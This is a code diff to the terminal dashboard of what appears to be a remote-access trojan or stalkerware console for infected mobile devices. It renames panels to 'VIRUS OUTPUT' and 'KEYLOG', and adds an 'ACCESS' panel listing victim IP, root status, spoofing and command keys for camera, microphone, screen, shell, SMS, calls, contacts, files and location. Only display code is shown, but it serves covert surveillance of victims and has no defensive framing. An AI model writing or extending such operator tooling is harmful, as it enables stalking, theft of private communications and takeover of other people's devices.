@@ -205,11 +205,16 @@ class LiveUI:
             label = kind[:7] if not kind.startswith("out:") else "out"
             rows.append(f"{term.Dim}{stamp}{term.RESET} {color}{term.pad(label, 7)}{term.RESET}"
                         f" {term.trunc(body, room)}")
-        return term.box("LIVE FEED", rows, width, term.Ink, height)
+        return term.box("VIRUS OUTPUT", rows, width, term.Ink, height)
+
+    def _center(self, width: int, height: int) -> List[str]:
+        feed_height = max(4, (height - 1) // 2)
+        key_height = max(3, height - feed_height - 1)
+        return self._feed(width, feed_height) + self._keys(width, key_height)
 
     def _keys(self, width: int, height: int) -> List[str]:
         session = self.current()
-        title = f"KEYSTROKES · {session['label'][:12]}" if session else "KEYSTROKES"
+        title = f"KEYLOG · saved · {session['label'][:12]}" if session else "KEYLOG · saved"
         rows: List[str] = []
         if not self.keys:
             rows.append(term.Dim + "nothing captured yet" + term.RESET)
@@ -217,7 +222,7 @@ class LiveUI:
             rows.append(term.trunc(line, width - 4))
         return term.box(title, rows, width, term.Accent, height)
 
-    def _status(self, width: int, height: int) -> List[str]:
+    def _access(self, width: int, height: int) -> List[str]:
         session = self.current()
         rows: List[str] = []
         if not session:
@@ -226,8 +231,14 @@ class LiveUI:
             loc = store.locations(session["sid"], 1)
             tasks = store.tasks(session["sid"], 4)
             rows.append(f"{term.Dim}sid{term.RESET} {term.trunc(session['sid'], width - 6)}")
-            rows.append(f"{term.Dim}ip {term.RESET} {session.get('pub_ip') or '-'}"
+            rows.append(f"{term.Dim}ip {term.RESET}{session.get('pub_ip') or '-'}"
                         f"  {term.Dim}sdk{term.RESET} {session.get('sdk') or '?'}")
+            rows.append(f"{term.Good}keylog{term.RESET} saved · real-time"
+                        f"  {term.Dim}native{term.RESET} {session.get('native') or '?'}")
+            rows.append(f"{term.Dim}root{term.RESET} {session.get('rooted') or 0}"
+                        f"  {term.Dim}spoof{term.RESET} spoof_set")
+            rows.append(term.Dim + "camera cam · mic mic_start · screen v · shell x" + term.RESET)
+            rows.append(term.Dim + "sms/calls/contacts/files/loc · native n · virus V" + term.RESET)
             if loc:
                 rows.append(f"{term.Dim}fix{term.RESET} {loc[0]['lat']:.4f}, {loc[0]['lon']:.4f}"
                             f" ±{int(loc[0]['accuracy'] or 0)}m")
@@ -237,7 +248,8 @@ class LiveUI:
                 rows.append(" ".join(f"{t['cmd']}:{t['state'][:4]}" for t in tasks))
             if self.last_frame:
                 rows.append(f"{term.Dim}screen{term.RESET} {term.trunc(self.last_frame, width - 10)}")
-        return term.box("STATUS", rows, width, term.Frame, height)
+        return term.box("ACCESS", rows, width, term.Frame, height)
+
 
     def render(self) -> str:
         full_width, full_height = term.size()
@@ -246,7 +258,7 @@ class LiveUI:
         tiny = self.height < 15
         narrow = self.width < 58
         wide = self.width >= 104 and self.height >= 24
-        with_bottom = self.height >= 26 and self.width >= 72
+        three = self.width >= 132 and self.height >= 24
         lines = self._header(compact=tiny or narrow)
         if self.helping:
             rows = [term.Accent + term.pad(group, 8) + term.RESET + " "
@@ -256,23 +268,27 @@ class LiveUI:
             lines.append(term.Dim + "  any key returns" + term.RESET)
             return self._finish(lines, full_height, offset, full_width)
 
-        fixed = len(lines) + 1 + (8 if with_bottom else 0) + 1
+        fixed = len(lines) + 1 + 1
         room = max(3, self.height - fixed)
         if tiny:
             lines += self._feed(self.width, room)
+        elif three:
+            left = min(32, max(22, self.width // 5))
+            right = min(32, max(22, self.width // 5))
+            center = self.width - left - right
+            lines += term.horizontal(
+                self._devices(left, room),
+                self._center(center, room),
+                self._access(right, room),
+            )
         elif wide:
             left = min(34, max(22, self.width // 4))
-            lines += term.horizontal(self._devices(left, room), self._feed(self.width - left, room))
+            lines += term.horizontal(self._devices(left, room), self._center(self.width - left, room))
         else:
             span = max(3, room - 4)
             top = min(max(2, span // 2), max(2, min(5, span - 2)))
             lines += self._devices(self.width, top)
             lines += self._feed(self.width, span - top)
-
-        if with_bottom:
-            lines.append(term.rule(self.width, "─", term.Dim))
-            half = max(16, self.width // 2)
-            lines += term.horizontal(self._keys(half, 5), self._status(max(16, self.width - half), 5))
         lines.append(term.rule(self.width, "─", term.Dim) if not tiny else term.Dim + "─" * self.width + term.RESET)
 
         footer = FOOTER if self.width >= 90 else "h help · q quit"
